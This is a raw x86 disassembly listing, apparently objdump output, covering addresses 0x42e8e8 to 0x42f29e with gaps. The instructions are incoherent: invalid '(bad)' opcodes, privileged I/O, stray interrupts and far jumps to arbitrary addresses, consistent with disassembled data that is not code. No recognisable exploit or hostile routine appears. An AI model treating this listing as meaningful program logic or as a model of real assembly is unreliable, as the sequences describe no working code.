  42e8e8:	mov    dh,0xba
  42e8ea:	cvtps2pd xmm4,QWORD PTR [eax-0x13]
  42e8ee:	retf   0xb635
  42e8f1:	sub    bl,0xd
  42e8f4:	push   edx
  42e8f5:	or     edi,DWORD PTR [ebx-0x4006eb73]
  42e8fb:	sbb    edx,esp
  42e8fd:	cmp    dl,al
  42e8ff:	fdiv   DWORD PTR [edx-0x2d]
  42e902:	push   ss
  42e903:	cmc    
  42e904:	test   ah,al
  42e906:	call   0x4995c3d5
  42e90b:	or     dl,BYTE PTR [eax+0x68]
  42e90e:	hlt    
  42e90f:	mov    bl,0x64
  42e911:	enter  0xfdf,0xb8
  42e915:	xor    dl,ah
  42e917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e918:	pcmpgtd mm1,QWORD PTR [ebx+0x72]
  42e91c:	mov    esi,0xf1e5e30e
  42e921:	dec    ebx
  42e922:	cmp    BYTE PTR [edi-0x8],dl
  42e925:	pushf  
  42e926:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e927:	not    DWORD PTR [edi+0x1b]
  42e92a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e92b:	sbb    eax,0x184572c7
  42e930:	int    0xaa
  42e932:	imul   esi,DWORD PTR [ebp+0x7b],0x1b
  42e936:	scas   al,BYTE PTR es:[edi]
  42e937:	cmp    cl,BYTE PTR [edx+0x28c9637b]
  42e93d:	cwde   
  42e93e:	call   0x2f2:0x93898f0e
  42e945:	(bad)  
  42e947:	push   esi
  42e948:	add    BYTE PTR ss:[ebx],ah
  42e94b:	push   0xffffff98
  42e94d:	cmc    
  42e94e:	jb     0x42e977
  42e950:	mov    ecx,0xec5fc78c
  42e955:	cdq    
  42e956:	pop    esi
  42e957:	inc    ebx
  42e958:	jns    0x42e934
  42e95a:	loope  0x42e935
  42e95c:	add    cl,BYTE PTR [edx+ebx*8+0x58]
  42e960:	cld    
  42e961:	or     BYTE PTR [ebp+0x68],ah
  42e964:	cmp    cl,bh
  42e966:	aas    
  42e967:	dec    edx
  42e968:	cmp    BYTE PTR [edx+eax*4],bh
  42e96b:	jae    0x42e9d0
  42e96d:	add    dl,BYTE PTR [ecx+0x2f40a916]
  42e973:	mov    al,ds:0x93d9a524
  42e978:	popf   
  42e979:	call   0x853ee240
  42e97e:	dec    esp
  42e97f:	ds and eax,0xbb455c7b
  42e985:	pop    eax
  42e986:	dec    esi
  42e987:	les    ecx,FWORD PTR [ebp+ecx*8+0x5d]
  42e98b:	inc    edi
  42e98c:	and    ebx,DWORD PTR ss:[edx-0x7a9b1fa7]
  42e993:	loop   0x42e936
  42e995:	cmp    eax,0x16b8d558
  42e99a:	push   0x9ecde9d9
  42e99f:	jecxz  0x42e9c0
  42e9a1:	mov    ah,BYTE PTR [eax-0x41]
  42e9a4:	pop    esp
  42e9a5:	xor    ebp,DWORD PTR [eax-0x36ee1cd3]
  42e9ab:	sbb    al,0x95
  42e9ad:	pop    edi
  42e9ae:	xor    bl,bl
  42e9b0:	jl     0x42e9eb
  42e9b2:	sbb    eax,0x23ac
	...
  42ea13:	add    BYTE PTR [eax],al
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	cmp    dh,BYTE PTR [esi+ebx*8]
  42ea25:	mov    dl,0xb8
  42ea27:	repz add DWORD PTR [eax],eax
  42ea2a:	pop    es
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    BYTE PTR [ebp-0x41],al
  42ea30:	adc    eax,0x1d0243f5
  42ea35:	dec    edi
  42ea36:	test   eax,0x8949a7e9
  42ea3b:	xchg   edx,eax
  42ea3c:	dec    edx
  42ea3d:	mov    bh,0x46
  42ea3f:	mov    eax,0x6f7f9f8
  42ea44:	sbb    eax,0xf3559702
  42ea49:	mov    bl,0x54
  42ea4b:	jge    0x42e9fa
  42ea4d:	push   edi
  42ea4f:	sbb    al,0x65
  42ea51:	push   edi
  42ea52:	jne    0x42ea29
  42ea54:	sub    DWORD PTR [ecx],0x5bf93cf5
  42ea5a:	push   0x18
  42ea5c:	xor    DWORD PTR [ebx+0x59],esp
  42ea5f:	data16 add BYTE PTR [ebx+ecx*1-0x318cd7d7],dh
  42ea67:	pop    ds
  42ea68:	mov    bh,0x65
  42ea6a:	add    BYTE PTR [esp+esi*4-0x16512ff],ch
  42ea71:	pop    ecx
  42ea72:	jmp    0x42ea9c
  42ea74:	leave  
  42ea75:	loopne 0x42ea7d
  42ea77:	inc    edi
  42ea78:	push   edi
  42ea79:	mov    ds:0x54dea319,eax
  42ea7e:	xchg   DWORD PTR [esi],ecx
  42ea80:	loopne 0x42ea7a
  42ea82:	xchg   ecx,eax
  42ea83:	das    
  42ea84:	sbb    al,0x55
  42ea86:	ds mov esi,0x975304ec
  42ea8c:	inc    eax
  42ea8d:	push   0x61
  42ea8f:	lods   eax,DWORD PTR ds:[esi]
  42ea90:	mov    esi,0x6d927a42
  42ea95:	data16 jge 0x42ea93
  42ea98:	add    al,0x33
  42ea9a:	jo     0x42eaea
  42ea9c:	pushf  
  42ea9d:	mov    eax,0x72f5dab3
  42eaa2:	mov    ds:0x68a4194e,al
  42eaa7:	test   BYTE PTR ds:0x8ac91157,ch
  42eaad:	jbe    0x42eab9
  42eaaf:	mov    ?,WORD PTR [edx]
  42eab1:	and    eax,0x786ced63
  42eab6:	je     0x42ea81
  42eab8:	push   eax
  42eab9:	imul   ebx,DWORD PTR [eax+0x48d8b6e8],0xffffffec
  42eac0:	jb     0x42eb23
  42eac2:	xor    BYTE PTR [esi],dl
  42eac4:	(bad)  
  42eac5:	call   0xa2b0:0xc8ce49d3
  42eacc:	jg     0x42eaeb
  42eace:	mov    bl,0x13
  42ead0:	retf   
  42ead1:	push   esp
  42ead2:	mov    al,ds:0xfe38d0f5
  42ead7:	out    0x78,al
  42ead9:	pop    edi
  42eada:	rol    DWORD PTR [ecx+0x28],cl
  42eadd:	jo     0x42ea9b
  42eadf:	or     ah,bl
  42eae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eae2:	fmul   DWORD PTR [esi-0x1c]
  42eae5:	dec    eax
  42eae6:	push   edi
  42eae7:	pop    esi
  42eae8:	out    0x51,eax
  42eaea:	es ds dec esp
  42eaed:	mov    ecx,0x19f1d92c
  42eaf2:	sbb    BYTE PTR [edi],bl
  42eaf4:	inc    edx
  42eaf5:	push   cs
  42eaf6:	mov    ch,0x56
  42eaf8:	int    0x24
  42eafa:	inc    edi
  42eafb:	mov    ch,0x22
  42eafd:	and    BYTE PTR [edx-0x26022c6],al
  42eb03:	repnz inc ecx
  42eb05:	cdq    
  42eb06:	out    dx,al
  42eb07:	lods   eax,DWORD PTR ds:[esi]
  42eb08:	data16 mov WORD PTR [edi],fs
  42eb0b:	mov    ?,WORD PTR [edx]
  42eb0d:	pop    esi
  42eb0e:	dec    edx
  42eb0f:	fstp   TBYTE PTR [edi]
  42eb11:	pop    esi
  42eb12:	(bad)  
  42eb13:	in     eax,0xb
  42eb15:	mov    eax,ds:0x2875583b
  42eb1a:	pop    ss
  42eb1b:	inc    edi
  42eb1c:	sub    edx,DWORD PTR [edi]
  42eb1e:	jne    0x42eafb
  42eb20:	dec    ebp
  42eb21:	repz pop esi
  42eb23:	imul   BYTE PTR [ebx+ecx*2-0x73]
  42eb27:	push   esi
  42eb28:	in     eax,0x1
  42eb2a:	adc    dh,BYTE PTR [edx-0x3a9617a0]
  42eb30:	mov    esi,ebp
  42eb32:	rol    BYTE PTR ds:0xf2,0x0
	...
  42eb95:	add    BYTE PTR [esi+0x41],bh
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi-0x18dba526],ebp
  42eba4:	ins    BYTE PTR es:[edi],dx
  42eba5:	inc    esp
  42eba6:	mov    edi,0x70001f4
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    BYTE PTR [ecx+edi*4-0x6c4e83ec],cl
  42ebb4:	pop    ecx
  42ebb5:	jg     0x42ec1f
  42ebb7:	pop    ebp
  42ebb8:	dec    esi
  42ebb9:	sbb    dh,BYTE PTR [esi+0x79]
  42ebbc:	dec    ebp
  42ebbd:	cmp    BYTE PTR [ebx+0x606cbedb],ah
  42ebc3:	lock cli 
  42ebc5:	push   edi
  42ebc6:	jae    0x42ec46
  42ebc8:	jmp    0x62801576
  42ebcd:	dec    edi
  42ebce:	cmp    BYTE PTR [edx],ch
  42ebd0:	sub    al,0xe1
  42ebd2:	sub    bh,BYTE PTR [edx+0x16]
  42ebd5:	je     0x42ec50
  42ebd7:	or     dl,BYTE PTR [ecx+0x21]
  42ebda:	sub    BYTE PTR [ebp-0x13546270],ah
  42ebe0:	xchg   ebp,eax
  42ebe1:	jmp    0x42ec40
  42ebe3:	push   0xffffff89
  42ebe5:	mov    WORD PTR [ecx+esi*8-0x1cb15574],ss
  42ebec:	add    al,0x97
  42ebee:	das    
  42ebef:	pop    ebp
  42ebf0:	lods   al,BYTE PTR ds:[esi]
  42ebf1:	aaa    
  42ebf2:	imul   edx,DWORD PTR [edi],0x44f5ed17
  42ebf8:	xchg   esp,eax
  42ebf9:	add    bh,BYTE PTR ds:0x13e62681
  42ebff:	jl     0x42ec34
  42ec01:	imul   edx,DWORD PTR [eax-0x48],0xffffffd5
  42ec05:	add    al,0x9b
  42ec07:	add    al,0xe4
  42ec09:	xchg   edi,eax
  42ec0a:	pusha  
  42ec0b:	ret    0xec3c
  42ec0e:	fistp  DWORD PTR [esi]
  42ec10:	int    0xd6
  42ec12:	js     0x42ec57
  42ec14:	cmp    DWORD PTR [esi-0x41],edx
  42ec17:	push   edi
  42ec18:	xchg   DWORD PTR [edi+0x55],ebx
  42ec1b:	sub    DWORD PTR [edi],eax
  42ec1d:	in     eax,0xb2
  42ec1f:	sub    ch,ch
  42ec21:	mov    ah,0x64
  42ec23:	jbe    0x42eba5
  42ec25:	jle    0x42ec26
  42ec27:	pop    esi
  42ec28:	xlat   BYTE PTR ds:[ebx]
  42ec29:	cmp    al,0x20
  42ec2b:	shl    BYTE PTR [edi+0x5c],cl
  42ec2e:	or     BYTE PTR [edx],0xcd
  42ec31:	sub    BYTE PTR [ecx+0x7aa4c9f6],al
  42ec37:	mov    ebx,0xe96dd160
  42ec3c:	enter  0x371,0x46
  42ec40:	pop    es
  42ec41:	push   eax
  42ec42:	push   edi
  42ec43:	sbb    eax,DWORD PTR [esp+edx*8]
  42ec46:	pop    esp
  42ec47:	daa    
  42ec48:	cld    
  42ec49:	inc    edi
  42ec4a:	and    BYTE PTR [esi-0x2079f94f],bh
  42ec50:	int    0xb4
  42ec52:	scas   eax,DWORD PTR es:[edi]
  42ec53:	hlt    
  42ec54:	fdivr  QWORD PTR [edx]
  42ec56:	add    al,0x35
  42ec58:	jne    0x42ebec
  42ec5a:	inc    BYTE PTR [eax]
  42ec5c:	mov    ebx,0x2a10a0b4
  42ec61:	jecxz  0x42ec66
  42ec63:	add    BYTE PTR [edi+ebp*2-0x361edc49],bh
  42ec6a:	cdq    
  42ec6b:	call   0x7fdd0037
  42ec70:	mov    ebp,0x6e37c6b6
  42ec75:	fs addr16 mov ecx,0xb38b7c9a
  42ec7c:	jecxz  0x42ece9
  42ec7e:	test   eax,0x568623a2
  42ec83:	inc    ecx
  42ec84:	sub    DWORD PTR [edx+eiz*1],0x6a
  42ec88:	in     al,0xc4
  42ec8a:	pop    ebx
  42ec8b:	je     0x42ecc1
  42ec8d:	inc    eax
  42ec8e:	fisubr WORD PTR [esi-0x30ac3dc0]
  42ec94:	int    0x5a
  42ec96:	adc    ch,BYTE PTR [ecx]
  42ec98:	div    dh
  42ec9a:	lea    esi,[esi+0x16008bd]
  42eca0:	sub    esp,eax
  42eca2:	nop
  42eca3:	test   al,0xb2
  42eca5:	mov    ds:0xe3b033f0,al
  42ecaa:	fstp   QWORD PTR [ebp-0x7fb86f54]
  42ecb0:	(bad)  
  42ecb1:	aad    0x4f
  42ecb3:	test   al,0x3e
	...
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi+0x65f0a17f]
  42ed23:	sbb    al,0xf1
  42ed25:	mov    eax,ds:0x1f5c6
  42ed2a:	pop    es
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [ebx+0x342a392c],dl
  42ed33:	pusha  
  42ed34:	pop    ds
  42ed35:	int    0x65
  42ed37:	xchg   DWORD PTR [esi],esi
  42ed39:	clc    
  42ed3a:	ret    
  42ed3b:	mov    bh,0x5e
  42ed3d:	es push ds
  42ed3f:	xlat   BYTE PTR ds:[ebx]
  42ed40:	jbe    0x42eccc
  42ed42:	fwait
  42ed43:	jbe    0x42ed0a
  42ed45:	not    bh
  42ed47:	mov    DWORD PTR ds:0x7a61d56,ecx
  42ed4d:	loope  0x42edbe
  42ed4f:	pop    ecx
  42ed50:	in     al,0xf9
  42ed52:	xor    eax,0xc992c5fe
  42ed57:	cmp    BYTE PTR [edx-0x5a6d5347],cl
  42ed5d:	scas   al,BYTE PTR es:[edi]
  42ed5e:	in     al,0x15
  42ed60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ed61:	cwde   
  42ed62:	jmp    0x42ed80
  42ed64:	sub    BYTE PTR [edi+ebx*4-0x4858cf52],dh
  42ed6b:	in     eax,dx
  42ed6c:	in     al,dx
  42ed6d:	jg     0x42ed10
  42ed6f:	inc    ebp
  42ed70:	pop    edx
  42ed71:	jle    0x42ed80
  42ed73:	jge    0x42edeb
  42ed75:	(bad)  
  42ed76:	mov    ds:0xe9a39f11,al
  42ed7b:	ins    DWORD PTR es:[edi],dx
  42ed7c:	xchg   ebp,eax
  42ed7d:	pop    ebx
  42ed7e:	loop   0x42ed80
  42ed80:	shl    DWORD PTR [edx-0x4ba0a3],0xcd
  42ed87:	xor    eax,0x20d01e8e
  42ed8c:	inc    edi
  42ed8d:	cmp    edx,DWORD PTR [edx]
  42ed8f:	jo     0x42ed33
  42ed91:	cdq    
  42ed92:	loop   0x42ed1c
  42ed94:	jge    0x42eda3
  42ed96:	sub    BYTE PTR [ecx+0x1757ef9c],bh
  42ed9c:	adc    BYTE PTR [esi-0x45],0xf
  42eda0:	bound  edx,QWORD PTR [eax+0x16]
  42eda3:	and    dh,cl
  42eda5:	mov    ecx,DWORD PTR [ebx+0x79]
  42eda8:	lds    esi,FWORD PTR [esi]
  42edaa:	mov    al,ds:0xa5656b1b
  42edaf:	mov    dl,0x93
  42edb1:	mov    bl,0x0
  42edb3:	call   0x7b2df8e0
  42edb8:	aas    
  42edb9:	push   cs
  42edba:	(bad)  
  42edbb:	xchg   ebp,eax
  42edbc:	xchg   DWORD PTR [ecx*2-0x45e39c80],esp
  42edc3:	ds xchg bp,ax
  42edc6:	call   0x9e190c
  42edcb:	sar    BYTE PTR ds:0xb2ba101f,0xb2
  42edd2:	mov    edx,0xcec96677
  42edd7:	lods   al,BYTE PTR ds:[esi]
  42edd8:	js     0x42ed80
  42edda:	gs cli 
  42eddc:	jns    0x42ed62
  42edde:	mov    eax,0xd0cbd67a
  42ede3:	mov    DWORD PTR [ecx-0x7395925f],esp
  42ede9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42edea:	int3   
  42edeb:	push   edx
  42edec:	jmp    0x64e69350
  42edf1:	cmp    DWORD PTR [esp+ebx*4+0xd],ebx
  42edf5:	cmp    ebp,esi
  42edf7:	xchg   edi,eax
  42edf8:	int    0xf8
  42edfa:	mov    edi,0xbdb7b846
  42edff:	jne    0x42ed9f
  42ee01:	aaa    
  42ee02:	cld    
  42ee03:	pop    edx
  42ee04:	(bad)  
  42ee05:	mov    eax,ds:0x4cfc0387
  42ee0a:	in     eax,dx
  42ee0b:	lods   eax,DWORD PTR ds:[esi]
  42ee0d:	and    BYTE PTR [ecx],bh
  42ee0f:	inc    eax
  42ee10:	pop    ebp
  42ee11:	cld    
  42ee12:	dec    ecx
  42ee13:	adc    ah,bh
  42ee15:	aaa    
  42ee16:	pop    esi
  42ee17:	bound  esp,QWORD PTR [esi-0x34]
  42ee1a:	mov    bl,0x8a
  42ee1c:	test   DWORD PTR [edx-0x7d],0x1c3679fd
  42ee23:	xor    dl,cl
  42ee25:	adc    BYTE PTR [esi],al
  42ee27:	and    BYTE PTR [ebx],dl
  42ee29:	add    al,0xa9
  42ee2b:	fisttp QWORD PTR [ebx+0x3e]
  42ee2e:	cmp    DWORD PTR [ecx+0x4eda6156],0xffffffc1
	...
  42ee95:	add    bl,al
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0x9bf4f479,edi
  42eea4:	inc    edi
  42eea5:	int3   
  42eea6:	int    0xf6
  42eea8:	add    DWORD PTR [eax],eax
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    BYTE PTR [edi+ebp*2+0x2294c0b4],al
  42eeb4:	repz pop ss
  42eeb6:	or     eax,0x7a120ed
  42eebb:	pop    es
  42eebc:	cmp    ebp,DWORD PTR [esi+0x4830eb13]
  42eec2:	ja     0x42eeb2
  42eec4:	mov    ecx,0xb5b8ffce
  42eec9:	popf   
  42eeca:	je     0x42ee8d
  42eecc:	test   al,0x4b
  42eece:	daa    
  42eecf:	inc    edx
  42eed0:	lods   al,BYTE PTR ds:[esi]
  42eed1:	imul   ecx,DWORD PTR [esi-0x71fa0b5b],0x1f1db2ad
  42eedb:	adc    BYTE PTR ds:0x83b40692,dh
  42eee1:	scas   eax,DWORD PTR es:[edi]
  42eee2:	jmp    0x42eefd
  42eee4:	add    BYTE PTR [ebp-0x5c91ac9d],dh
  42eeea:	jb     0x42eedc
  42eeec:	dec    ebp
  42eeed:	pandn  mm2,mm6
  42eef0:	pushf  
  42eef1:	es adc eax,0x1df076a6
  42eef7:	cld    
  42eef8:	jge    0x42ef1d
  42eefa:	push   esp
  42eefc:	fldcw  WORD PTR [edi+0x3a]
  42eeff:	mov    ds:0xcec9375c,eax
  42ef04:	cld    
  42ef05:	adc    dl,ch
  42ef07:	sahf   
  42ef08:	imul   ebp,DWORD PTR [ebp-0x77],0xeb4b1cf5
  42ef0f:	out    0x1c,eax
  42ef11:	and    BYTE PTR [ecx-0xb1f9067],ch
  42ef17:	jns    0x42ef7a
  42ef19:	xor    DWORD PTR [edi-0x354a7629],0x107c5070
  42ef23:	sahf   
  42ef24:	xchg   BYTE PTR [eax-0x3ab88d03],dh
  42ef2a:	push   cs
  42ef2b:	xchg   esi,eax
  42ef2c:	repnz lods eax,DWORD PTR ds:[esi]
  42ef2e:	xchg   esp,eax
  42ef2f:	into   
  42ef30:	cmp    BYTE PTR [ebx-0xa],bl
  42ef33:	xchg   esi,eax
  42ef34:	mov    eax,0xcd894b69
  42ef39:	bound  ecx,QWORD PTR [eax]
  42ef3b:	xor    dl,bh
  42ef3d:	jbe    0x42ef6c
  42ef3f:	mov    bh,0x3b
  42ef41:	sub    bl,BYTE PTR [ebx+eax*8+0x32]
  42ef45:	sbb    ebp,esp
  42ef47:	outs   dx,BYTE PTR ds:[esi]
  42ef48:	add    eax,0xd69e4c6
  42ef4d:	push   ds
  42ef4e:	add    esp,ecx
  42ef50:	adc    al,0x7
  42ef52:	sub    eax,0x21d20cb6
  42ef57:	cmp    eax,0x26e91794
  42ef5c:	out    0x17,al
  42ef5e:	jne    0x42ef7c
  42ef60:	sbb    ch,BYTE PTR ds:0xaee3a249
  42ef66:	in     al,dx
  42ef67:	test   BYTE PTR [esi-0x59],ch
  42ef6a:	dec    esp
  42ef6b:	xchg   ebp,eax
  42ef6c:	test   eax,0x769930b7
  42ef71:	xchg   edi,eax
  42ef72:	ror    BYTE PTR cs:[edx+0x1a],1
  42ef76:	pop    esp
  42ef77:	repz xor al,0xf3
  42ef7a:	repnz add esp,DWORD PTR [ebp+eax*4+0x1e5d68ff]
  42ef82:	sub    ah,BYTE PTR [edx+esi*4+0x76]
  42ef86:	(bad)  
  42ef87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef88:	out    0xf5,al
  42ef8a:	jae    0x42efda
  42ef8c:	xchg   esi,eax
  42ef8d:	mov    al,BYTE PTR [esi]
  42ef8f:	icebp  
  42ef90:	icebp  
  42ef91:	add    esp,eax
  42ef93:	hlt    
  42ef94:	fucom  st(2)
  42ef96:	cmp    al,0x6
  42ef98:	pop    ds
  42ef99:	fild   WORD PTR gs:[esi-0x2]
  42ef9d:	dec    ebx
  42ef9e:	mov    bh,0x52
  42efa0:	int    0xc1
  42efa2:	and    dh,bl
  42efa4:	inc    edx
  42efa5:	adc    ah,BYTE PTR [ecx+ecx*4-0x69]
  42efa9:	mov    BYTE PTR [ebx+0x6f],dh
  42efac:	iret   
  42efad:	dec    edx
  42efae:	adc    bh,BYTE PTR [ebx+0x6b01dd66]
  42efb4:	sub    al,0x0
	...
  42f016:	adc    bh,BYTE PTR [esi]
  42f018:	int    0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0x9563d516
  42f024:	sub    cl,BYTE PTR [eax-0x2c]
  42f027:	test   DWORD PTR [ecx],0x10700
  42f02d:	add    BYTE PTR [ebx-0x1d],cl
  42f030:	jl     0x42eff2
  42f032:	xchg   edx,eax
  42f033:	dec    esi
  42f034:	sbb    DWORD PTR [ebx+eax*4],0xaea108e0
  42f03b:	jo     0x42f008
  42f03d:	sub    al,0x94
  42f03f:	xor    ebp,esi
  42f041:	sub    BYTE PTR ds:0x63fdcb55,al
  42f047:	fst    DWORD PTR [edx-0x17]
  42f04a:	in     eax,0x20
  42f04c:	out    dx,al
  42f04d:	sub    DWORD PTR [esi+esi*8],edx
  42f050:	cli    
  42f051:	cmp    BYTE PTR [eax+eiz*4+0x43],0x74
  42f056:	jle    0x42f0a0
  42f058:	inc    esi
  42f059:	jge    0x42f047
  42f05b:	inc    eax
  42f05c:	in     eax,0xe6
  42f05e:	popf   
  42f05f:	fisttp QWORD PTR [ebp+0x2d]
  42f062:	sub    DWORD PTR [edx+eiz*2+0x47],ebp
  42f066:	pop    ds
  42f067:	pop    ebx
  42f068:	dec    ebp
  42f069:	enter  0xd10a,0xf6
  42f06d:	and    bh,BYTE PTR [edi]
  42f06f:	adc    BYTE PTR [ecx],0xb6
  42f072:	sub    DWORD PTR [eax+0x3d7fa0f3],ebp
  42f078:	sub    BYTE PTR [ecx-0x29],bl
  42f07b:	jecxz  0x42f069
  42f07d:	jp     0x42f0ab
  42f07f:	inc    edx
  42f080:	cmp    DWORD PTR [edx],ebx
  42f082:	pop    esi
  42f083:	cmp    ebx,edx
  42f085:	dec    esp
  42f086:	sub    al,0x93
  42f088:	addr16 inc ebp
  42f08a:	stos   BYTE PTR es:[edi],al
  42f08b:	mov    dh,0x80
  42f08d:	sub    esp,edx
  42f08f:	lahf   
  42f090:	xor    BYTE PTR [esi-0x2c0d4472],dh
  42f096:	inc    ecx
  42f097:	push   ebx
  42f098:	es jecxz 0x42f10e
  42f09b:	or     ecx,edx
  42f09d:	icebp  
  42f09e:	sti    
  42f09f:	sbb    ecx,0x379fcf72
  42f0a5:	les    edi,FWORD PTR [eax]
  42f0a7:	sub    BYTE PTR [edi],bh
  42f0a9:	popa   
  42f0aa:	adc    al,0x69
  42f0ac:	jmp    0x3fd1:0xa2b88f9a
  42f0b3:	inc    eax
  42f0b4:	int3   
  42f0b5:	mov    al,0xd6
  42f0b7:	dec    edx
  42f0b8:	xor    eax,0x18c2345d
  42f0bd:	cmp    eax,0xe629a00f
  42f0c2:	test   eax,0xf5dde228
  42f0c7:	call   0x58a91117
  42f0cc:	add    DWORD PTR [edx],ebp
  42f0ce:	pop    ss
  42f0cf:	xchg   esi,eax
  42f0d0:	lods   al,BYTE PTR ds:[esi]
  42f0d1:	sar    dl,1
  42f0d3:	(bad)  
  42f0d4:	and    edi,DWORD PTR [ebp-0x2b]
  42f0d7:	imul   esi
  42f0d9:	out    0xf6,al
  42f0db:	sbb    BYTE PTR [eax+0x26],ah
  42f0de:	adc    ebp,DWORD PTR [edi-0x70]
  42f0e1:	jns    0x42f148
  42f0e3:	push   edx
  42f0e4:	xchg   bp,ax
  42f0e6:	or     DWORD PTR [eax-0x56c42c42],ebp
  42f0ec:	scas   eax,DWORD PTR es:[edi]
  42f0ed:	xchg   esp,eax
  42f0ee:	rcr    esi,1
  42f0f0:	leave  
  42f0f1:	push   esp
  42f0f2:	pop    ds
  42f0f3:	cld    
  42f0f4:	xor    DWORD PTR [eax+ecx*8],edi
  42f0f7:	xchg   esi,eax
  42f0f8:	sub    eax,edx
  42f0fa:	fs jmp 0x42f0f3
  42f0fd:	sbb    dh,BYTE PTR [ebx*4+0x4348e980]
  42f104:	pop    edi
  42f105:	adc    eax,0x1b56df8d
  42f10a:	mov    ds:0x4383c975,eax
  42f10f:	hlt    
  42f110:	adc    cl,BYTE PTR [eax+0x27]
  42f113:	es adc eax,0x954769b7
  42f119:	cmp    eax,0xd96881ae
  42f11e:	jecxz  0x42f0f4
  42f120:	in     al,0x63
  42f122:	jg     0x42f0f4
  42f124:	xchg   edi,eax
  42f125:	push   0x6
  42f127:	and    al,bh
  42f129:	sti    
  42f12a:	and    al,0x2e
  42f12c:	mov    esi,0x81c7f996
  42f131:	lock add esi,DWORD PTR [edx+0x12]
	...
  42f195:	add    BYTE PTR [edx+0x26],bl
  42f198:	jecxz  0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f12f
  42f1a3:	dec    ecx
  42f1a4:	xchg   ecx,eax
  42f1a5:	(bad)  
  42f1a6:	(bad)  
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    BYTE PTR [edx+0x48],cl
  42f1b0:	pop    edx
  42f1b1:	cmp    ecx,ebp
  42f1b3:	sbb    bl,bl
  42f1b5:	inc    ecx
  42f1b6:	bnd jb 0x42f22c
  42f1b9:	lock mov ds:0xf3f3abc2,eax
  42f1bf:	xchg   ebx,eax
  42f1c0:	mov    ah,0xf2
  42f1c2:	ja     0x42f189
  42f1c4:	fisub  WORD PTR [eax+eax*2]
  42f1c7:	inc    edx
  42f1c8:	imul   ebp,DWORD PTR [edi+0x2007138a],0x55
  42f1cf:	inc    esi
  42f1d0:	xor    DWORD PTR [esp+ecx*2-0x57],ebp
  42f1d4:	and    ah,BYTE PTR [edi-0x4ce97317]
  42f1da:	xchg   edi,eax
  42f1db:	ret    0xb66a
  42f1de:	pop    esp
  42f1df:	test   DWORD PTR [ecx+0x9],esp
  42f1e2:	lds    ebx,FWORD PTR [edi+edx*1-0x1704dbd8]
  42f1e9:	push   0x68
  42f1eb:	or     DWORD PTR [eax],edx
  42f1ed:	mov    ds:0x88a735a0,al
  42f1f2:	cli    
  42f1f3:	dec    edx
  42f1f4:	sub    ah,al
  42f1f6:	add    DWORD PTR [edi],edi
  42f1f8:	pop    ds
  42f1f9:	and    DWORD PTR [edi],ecx
  42f1fb:	and    DWORD PTR [eax+eax*1],esp
  42f1fe:	lods   al,BYTE PTR ds:[esi]
  42f1ff:	xor    DWORD PTR [edi+0x3f],esp
  42f202:	pop    edx
  42f203:	sub    BYTE PTR [ebx+0x31],bl
  42f206:	pop    esp
  42f207:	sbb    edx,DWORD PTR [ecx-0x50]
  42f20a:	loopne 0x42f1a8
  42f20c:	adc    eax,0x1a4eb6a5
  42f211:	cmp    BYTE PTR [esi],dh
  42f213:	rol    BYTE PTR [ebx+0x53],1
  42f216:	mov    dl,0x3c
  42f218:	jns    0x42f1a3
  42f21a:	(bad)  
  42f21b:	adc    DWORD PTR [ebp+0x7517f4a2],ebx
  42f221:	stos   BYTE PTR es:[edi],al
  42f222:	(bad)  
  42f223:	sub    eax,0x3b34d736
  42f228:	xor    al,0xf8
  42f22a:	ret    0xfd8c
  42f22d:	and    DWORD PTR [eax+0x60],esi
  42f230:	inc    edi
  42f231:	std    
  42f232:	mov    cl,dl
  42f234:	(bad)  
  42f236:	push   edi
  42f238:	ins    BYTE PTR es:[edi],dx
  42f239:	sbb    cl,ah
  42f23b:	push   ebx
  42f23c:	fs hlt 
  42f23e:	int    0x86
  42f240:	sbb    DWORD PTR [ebp+0x1058bfe6],0x1da013cb
  42f24a:	es jecxz 0x42f281
  42f24d:	loopne 0x42f226
  42f24f:	sar    BYTE PTR [edx+0x75f11b21],1
  42f255:	adc    DWORD PTR [esi+0x2c],esi
  42f258:	mov    ebp,DWORD PTR [edx]
  42f25a:	and    al,0x27
  42f25c:	sti    
  42f25d:	call   DWORD PTR [eax-0xe]
  42f260:	inc    eax
  42f261:	jmp    0x990c:0xfaf93324
  42f268:	add    BYTE PTR [ecx+0x79c96304],bh
  42f26e:	cs cmp eax,0x481dd9f8
  42f274:	or     DWORD PTR [ebx+0xe],ebp
  42f277:	sub    eax,0xfb849351
  42f27c:	jge    0x42f2af
  42f27e:	mov    bl,0x28
  42f280:	add    dl,ah
  42f282:	cwde   
  42f283:	jbe    0x42f24b
  42f285:	cmp    esi,DWORD PTR [ecx-0x44708ba1]
  42f28b:	sub    cl,BYTE PTR [esi]
  42f28d:	hlt    
  42f28e:	fs jae 0x42f25f
  42f291:	mov    ds:0x47ee06c6,eax
  42f296:	dec    esi
  42f297:	retf   
  42f298:	cld    
  42f299:	test   eax,0xc251bd79
  42f29e:	stos   DWORD PTR es:[edi],eax
